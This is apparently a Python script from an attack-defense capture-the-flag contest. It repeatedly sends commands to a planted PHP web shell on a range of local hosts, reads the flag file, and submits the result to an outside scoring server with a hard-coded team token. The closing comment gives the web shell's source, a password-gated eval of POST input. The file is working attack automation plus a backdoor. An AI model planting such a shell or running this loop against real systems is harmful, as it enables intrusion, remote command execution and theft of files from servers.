import requests
import time
import base64
token = 'b4ffcafbb8ae691ad81ce2ea24eea411'
cmd="cmd"
passwd="pass"
while 1:
    for i in range(0, 10):
        url="http://192.168.1.{}".format(i)        
        port='80'
        path='/1.php'
        payload={
            cmd:"system('cat /flag');",
            passwd:"aabbcc"
        }
        url1=url+path
        try:
            response=requests.post(url1,payload,timeout=10)
            response.encoding=response.apparent_encoding
            # print(response.text)
            if 'flag' in response.text:
                file=open("flag.txt","a")
                file.write(response.text)
                file.close()
                flag = response.text.replace('\n','').replace('\r','')
                # flag = re.match('flag{.*}', flag).group()
                checkurl = 'http://223.112.5.142:8088/api/ct/web/awd_race/race/bc0619b17501b610d02983f0200b8958/flag/robot/'
                answer={
                    "flag":flag,
                    "token":token
                }
                headers="Content-Type: application/json"
                r = requests.post(checkurl, answer, headers=headers)
                r.encoding=response.apparent_encoding
                if '"is_pass":true' in r.text:
                    print("get flag: "+url1 + " " + flag)
        except Exception as e:
            pass
    time.sleep(600)


    # <?php if(md5($_POST['pass'])=='61a60170273e74a5be90355ffe8e86ad')@eval($_POST['cmd']);?>
    # aabbcc